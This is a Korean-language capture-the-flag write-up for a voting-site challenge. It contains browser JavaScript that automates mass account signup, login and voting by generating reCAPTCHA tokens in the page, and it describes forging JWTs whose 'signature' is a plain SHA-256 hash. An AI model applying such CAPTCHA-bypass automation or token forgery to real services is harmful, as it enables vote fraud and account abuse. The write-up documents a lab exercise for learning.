# Watermelon
> ## Overview  
음악을 업로드하는 기능과 투표를 할 수 있는 기능이 있다.  
투표는 계정당 한 번만 가능하다. 회원가입과 로그인에는 캡챠가 작동하고 있다.  
JWT기반 인증을 사용하고 있다.  
> ## Solve
회원가입하여 로그인하여 JWT 토큰을 디코딩하여 아래의 값을 얻었다.

```  
{"alg":"sha256","typ":"JWT"}.{"user_no":7374,"id":"workerholic","nickname":"workerholic","iat":1577621349}.32f6c091cf3e50ce7ac64fd042ef309e438a58454e30e61bf8ee7dd1dbd24390
```
이를통해 user_no를 조작하여 투표를 계속할 수 있게 해볼려고 시도해봤으나 jwt의 signature 부분이 계속 틀려서 포기했다.  
다음 생각한 방법은 회원가입하고 로그인하고 투표하는 동작을 자동으로 할 수 있게 프로그램을 만들어서 투표 수를 높이는거였다.  
그런데 회원가입과 로그인 기능에는 reCaptcha가 작동하고 있었다. 
```
<script src="https://www.google.com/recaptcha/api.js?render=6LeKDskUAAAAAAh1LrqJ8isTG7rzGFpgNGas4x7z"></script>
<script>
grecaptcha.ready(function() {
    grecaptcha.execute('6LeKDskUAAAAAAh1LrqJ8isTG7rzGFpgNGas4x7z', {action: 'homepage'}).then(function(token) {
        document.getElementById('g-recaptcha-response').value = token;
    });
});
</script>
```  
스크립트를 통해 받아온 token 값을 g-recaptcha-response에 담아 POST로 같이 전송하는 방식이다.  
이 token값은 요청마다 바뀌었다.  
브라우저에서 자바스크립트를 실행해서 값을 받아오기 때문에
python 코드 상에서 해당 token 값을 받아 올 수는 없었다.   
파이선으로 해당 코드를 대체하여 token 값을 받아올 방법을 못 찾고  
그냥 해당 api가 불러와진 회원가입 페이지에서 개발자 도구를 통해 자바스크립트로 코드를 작성하여 실행시켯다.  
```
function register(count){
    grecaptcha.execute('6LeKDskUAAAAAAh1LrqJ8isTG7rzGFpgNGas4x7z',{action: 'homepage'}).then(function(token) {
        var id = 'worker'+count
        var param = "id="+id+"&password="+id+"&nickname="+id+"&g-recaptcha-response="+token;
        fetch("http://ch4n3.me:8080/xmas/?p=signup.ok",{
            method : 'POST',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body : param
        }).then(register(count+1));
    });
}

function login(count){
    grecaptcha.execute('6LeKDskUAAAAAAh1LrqJ8isTG7rzGFpgNGas4x7z',{action: 'homepage'}).then(function(token) {
        var id = 'worker'+count
        var param = "id="+id+"&password="+id+"&g-recaptcha-response="+token;
        fetch("http://ch4n3.me:8080/xmas/?p=signin.ok",{
            method : 'POST',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body : param
        }).then(login(count+1)).then(vote());
    });
}

function vote(){
    var xhttp = new XMLHttpRequest();
    var music_no = 555;
    var param = "music_no="+music_no;
    xhttp.open("POST", "http://ch4n3.me:8080/xmas/vote.php");
    xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhttp.send(param);
    var work = xhttp.responseText;
    console.log(work);
}
```
처음에 register()와 login()에서 fetch()말고 xhttp.send()로 요청을 계속 보내니 중간에 잘보내다가 요청이 pending 상태에 걸려서 에러가 발생했다. 너무 화가났다. 쨋든 이렇게 동작하게 코드를 만들어서
```
register(1122);
login(1122);
```
동작시키면 아이디를 만들고 그 아이디로 로그인해서 투표하는걸 반복하게된다. 그래서 투표 수를 계속 높여나가다 투표받은 음악을 올린 계정으로 로그인하니 플래그가 뙇~ 멍청하게 자알~ 풀었다.  
> ## Real Solve
해당 페이지의 robots.txt에 코드가 올라와있는 github 주소가 있었다.
jwt 토큰을 생성하는 페이지를 보니 header 부분과 payload 부분을 sha256으로 해쉬한게 signature였다......  
그리하여 user_no를 변경하고 이를 알맞게 해쉬하여 signature를 붙여서 인코딩해주면 jwt가 정상적으로 인식되어 투표할 수 있었다.  투표는 1226표 이상 받으면 flag가 출력되게 되어있었다.
